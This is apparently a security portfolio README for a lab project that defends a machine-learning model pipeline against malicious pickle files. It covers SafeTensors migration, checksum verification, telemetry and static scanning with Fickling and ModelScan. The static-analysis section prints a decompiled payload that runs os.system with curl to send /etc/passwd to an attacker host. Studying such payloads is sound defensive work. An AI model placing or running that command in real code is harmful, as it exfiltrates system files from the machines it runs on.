# SupplySecLab: Securing the AI Supply Chain

> End-to-end AI Supply Chain Security project demonstrating secure model intake, provenance verification, integrity validation, static malware analysis, and secure serialization techniques for machine learning deployments.


---

# Project Overview

Modern AI systems rely heavily on externally sourced machine learning models, pretrained weights, third-party repositories, dependencies, and API providers.

Unfortunately, every one of these components becomes part of an organization's **AI Supply Chain**, creating an entirely new attack surface.

In this project, I assumed the role of a **Security Engineer** tasked with building **SupplySecLab**, an internal AI Model Security Pipeline designed to prevent malicious models from reaching production.

The project focused on implementing multiple layers of defense capable of detecting:

- Malicious Pickle payloads
- Model tampering
- Model provenance issues
- Hidden architecture backdoors
- Unsafe serialization
- Dependency supply-chain attacks
- Third-party AI provider risks

---

# Objectives

- Eliminate Pickle-based Remote Code Execution
- Implement secure model serialization
- Verify model integrity using SHA-256
- Validate model provenance
- Detect malicious model payloads
- Perform static model analysis
- Build secure model acquisition workflows
- Improve AI deployment security

---

# Skills Demonstrated

- AI Supply Chain Security
- Secure Machine Learning Deployment
- Model Provenance Validation
- SHA-256 Integrity Verification
- Secure Serialization
- Static Malware Analysis
- AI Security Engineering
- Threat Detection
- Linux Security
- Python Security Tooling

---

# Technologies Used

- Linux
- Python
- PyTorch
- SafeTensors
- SHA-256
- Fickling
- ModelScan
- JSON
- Pickle
- h5py

---

# Project Architecture

```
                  External Model
                        │
                        ▼
              Quarantine Environment
                        │
                        ▼
             Verify Publisher Identity
                        │
                        ▼
               Verify SHA256 Hash
                        │
                        ▼
          Static Security Scanning
        (Fickling + ModelScan)
                        │
                        ▼
           Architecture Inspection
                        │
                        ▼
               Production Approval
```

---

# Project 1 — Secure Model Serialization

## Background

The original attack originated from a malicious Pickle model that executed arbitrary code immediately after loading.

The objective was to eliminate this attack vector completely.

---

## Implemented Defenses

### SafeTensors

Migrated models away from Pickle into the SafeTensors format.

SafeTensors only stores tensor weights and completely removes executable Python bytecode.

Advantages:

- No arbitrary code execution
- Zero-copy loading
- Header validation
- Safer production deployment

---

### Restricted Pickle Loading

Implemented PyTorch secure loading using:

```python
torch.load(
    "model.pt",
    weights_only=True
)
```

This prevents Pickle from reconstructing arbitrary Python objects while only allowing tensor reconstruction.

---

## Security Improvement

Before:

```
Pickle
↓

Execute Payload

↓

Load Model
```

After:

```
SafeTensors

↓

Validate Header

↓

Load Weights

↓

Inference
```

---

# Evidence

## Safe Serialization Workflow

```python
model_weights = torch.load(
    "model.pkl",
    weights_only=True
)

save_file(
    model_weights,
    "model.safetensors"
)

safe_weights = load_file(
    "model.safetensors"
)
```

---

## Evidence Summary

✔ Eliminated Pickle execution risk

✔ Migrated model into SafeTensors

✔ Restricted deserialization

✔ Applied secure loading practices

---

# Project 2 — Model Integrity & Provenance Verification

## Background

A legitimate-looking model may still have been modified after publication.

To detect tampering, every downloaded model must undergo integrity verification.

---

## Security Controls

Implemented:

- SHA-256 verification
- Published checksum validation
- Model card review
- Author verification
- Provenance validation

---

# Model Acquisition Framework

```
Download

↓

Quarantine

↓

Verify Source

↓

Verify SHA256

↓

Static Scan

↓

Approve

↓

Production
```

---

## Evidence

### Repository Contents

```bash
ls -la /opt/supply-chain/models
```

Output

```text
checksums.json
code_reviewer.pkl
code_reviewer_v1.pkl
image_classifier.h5
image_classifier_v2.h5
model_review_v2.pkl
product_recommender.pkl
product_recommender.safetensors
```

---

### Published Checksums

```bash
cat checksums.json
```

Evidence

```json
{
"product_recommender.safetensors":
"c59f50869015d456...",

"model_review_v2.pkl":
"b7c4d2e8f1a3b5c6...",

"product_recommender.pkl":
"e4e71a435d614cbd..."
}
```

---

### SHA-256 Verification

```bash
sha256sum model_review_v2.pkl
```

Evidence

```text
58ebc2e4ef8267e7...
```

Published checksum

```text
b7c4d2e8f1a3b5c6...
```

Result

❌ Hash mismatch detected

Model had been modified after publication.

---

## Investigation Result

The compromised artifact identified during verification:

```
model_review_v2.pkl
```

---

## Evidence Summary

✔ Verified publisher integrity

✔ Compared published hashes

✔ Detected model tampering

✔ Prevented compromised model deployment

---

# Project 3 — Behavioral Analysis of Malicious Models

## Background

Rather than immediately executing unknown models, telemetry was collected to observe model behavior during loading.

---

## Clean Model Baseline

```
SESSION START

↓

MODEL LOAD

↓

FILE ACCESS

↓

MODEL LOADED

↓

SESSION END
```

---

## Malicious Model Behavior

Telemetry immediately revealed suspicious activity.

---

### Evidence

```
IMPORT
[DANGEROUS]

SYSTEM CALL
[CRITICAL]

SYSTEM CALL
[CRITICAL]

MODEL COMPLETE

object_type=int
```

---

## Indicators Detected

- Imported os module
- Executed shell commands
- Attempted credential exfiltration
- Returned integer instead of ML model

---

## Security Finding

The payload attempted to access system credentials immediately during deserialization.

---

## Investigation Result

Returned object:

```
int
```

instead of

```
SentimentModel
```

---

## Evidence Summary

✔ Behavioral telemetry collected

✔ Suspicious imports detected

✔ Shell execution identified

✔ Payload execution confirmed

✔ Compromised model rejected

---

# Project 4 — Static Malware Analysis of Machine Learning Models

## Objective

Perform static analysis on serialized machine learning models before deployment.

---

## Tools Used

- Fickling
- ModelScan

---

# Fickling Analysis

Executed:

```bash
fickling model_review_v2.pkl
```

---

### Decompiled Payload

```python
from os import system

system(
"curl http://attacker.com/exfil -d @/etc/passwd"
)
```

---

### Automated Safety Scan

```bash
fickling --check-safety -p model_review_v2.pkl
```

Evidence

```
os.system detected

Unsafe pickle

Do not unpickle this file
```

---

# ModelScan Analysis

Executed

```bash
modelscan -p model_review_v2.pkl
```

---

### Evidence

```
Severity

CRITICAL

Unsafe operator

os.system
```

---

### SafeTensors Comparison

Executed

```bash
modelscan product_recommender.safetensors
```

Evidence

```
No issues found
```

---

# Security Outcome

Successfully distinguished:

✔ Safe serialized model

from

❌ Weaponized Pickle payload

---

# Evidence Summary

✔ Decompiled malicious Pickle

✔ Detected shell execution

✔ Classified Critical severity

✔ Prevented malicious deployment

---

# Key Security Concepts Demonstrated

- Secure AI Supply Chains
- Secure Serialization
- SafeTensors Migration
- SHA-256 Verification
- Model Provenance
- Static Malware Analysis
- Behavioral Analysis
- Threat Detection
- Secure Model Intake
- Production Security Gates

---


# Outcome

Successfully designed and implemented the first phase of an enterprise AI supply chain security pipeline capable of preventing malicious machine learning models from entering production through secure serialization, integrity validation, provenance verification, behavioral telemetry, and static malware analysis.


---

## Disclaimer

This project was completed in an **authorized cybersecurity training environment** designed to simulate real-world AI supply chain attacks against machine learning pipelines.

No production systems or third-party infrastructure were targeted.
